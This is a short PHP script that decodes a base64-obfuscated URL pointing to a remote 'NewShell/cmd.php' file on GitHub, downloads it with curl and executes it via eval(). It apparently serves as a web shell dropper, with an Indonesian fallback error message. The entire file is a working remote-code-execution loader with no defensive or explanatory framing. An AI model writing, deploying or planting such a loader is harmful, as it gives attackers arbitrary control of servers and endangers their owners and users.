<?php
function encode_file($data) {
    return base64_encode($data);
}

function decode_file($data) {
    return base64_decode($data);
}


$encoded_url = "cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9wYXlsYXIvTmV3U2hlbGwvcmVmcy9oZWFkcy9tYWluL2NtZC5waHA==";


$decoded_url = decode_file($encoded_url);


function get_file_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $data = curl_exec($ch);
    curl_close($ch);
    
    return $data;
}


$file_contents = get_file_contents_curl($decoded_url);


if ($file_contents !== false && !empty($file_contents)) {
    
    eval("?>" . $file_contents);
} else {
    echo "File tidak ditemukan atau rusak.";
}
?>
